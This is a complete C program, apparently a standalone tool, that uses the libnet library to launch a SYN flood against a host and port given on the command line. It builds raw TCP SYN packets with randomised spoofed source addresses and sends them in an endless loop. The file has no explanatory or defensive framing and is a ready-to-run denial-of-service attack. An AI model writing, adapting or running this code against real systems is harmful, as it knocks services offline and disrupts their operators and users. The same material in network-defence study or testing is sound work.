#include<stdio.h>
#include<stdlib.h>
#include<libnet.h>

#ifndef __USE_MISC
#define __USE_MISC
#endif

#include<unistd.h>

#define FLOOD_DELAY 5000

char *print_ip(uint32_t ip_addr){
    struct in_addr addr;
    addr.s_addr = ip_addr;
    return inet_ntoa(addr); 
}
int main(int argc, char *argv[]){
    libnet_t *context;
    uint8_t errbuf[1024];
    uint32_t dest_ip;
    uint16_t dest_port;

    libnet_ptag_t libnet_ptag;

    int sockfd, byte_count,packet_size = LIBNET_IPV4_H + LIBNET_TCP_H;

    if(argc < 3){
        printf("Usage: %s <target host> <target port>\n",argv[0]);
        exit(-1);
    }

    /*Since it is raw4, we created a context for it*/
    context = libnet_init(LIBNET_RAW4,NULL,errbuf);
    if(context == NULL){
        printf("Error while initializing\n");
        return -1;
    }

    /*Resolve hostname to IP*/
    dest_ip = libnet_name2addr4(context,argv[1],LIBNET_RESOLVE);
    dest_port = (uint16_t) atoi(argv[2]);

    /*Open raw socket*/
    if((sockfd = libnet_open_raw4(context)) == -1){
        printf("Couldn't open socket.\n");
        return -1;
    }

    /*Seed for generating pseudo random numbers*/
    libnet_seed_prand(context);

    printf("SYN Flood started on %s:%d\n",print_ip(dest_ip),dest_port);

    while(1){
        /*Build IP packet*/
        libnet_ptag = libnet_build_ipv4(LIBNET_IPV4_H,
            IPTOS_LOWDELAY,
            libnet_get_prand(LIBNET_PRu16),
            0,
            libnet_get_prand(LIBNET_PR8),
            IPPROTO_TCP,0,libnet_get_prand(LIBNET_PRu32),
            dest_ip,NULL,0,context,0);
        /*Build tcp packet*/
        libnet_build_tcp(libnet_get_prand(LIBNET_PRu16),dest_port,
            libnet_get_prand(LIBNET_PRu32),libnet_get_prand(LIBNET_PRu32),
            TH_SYN,libnet_get_prand(LIBNET_PRu16),0,0,LIBNET_TCP_H,NULL,0,context,libnet_ptag);

        byte_count = libnet_write(context);
        if(byte_count < packet_size){
            printf("Warning: Incomplete packet written!\n");
        }else{
            printf("Packet sent\n");
        }
        usleep(FLOOD_DELAY);
    }
    if(libnet_close_raw4(context) == -1)
            printf("ERROR: Couldn't closed connection\n");
    libnet_destroy(context);
    return 0;
}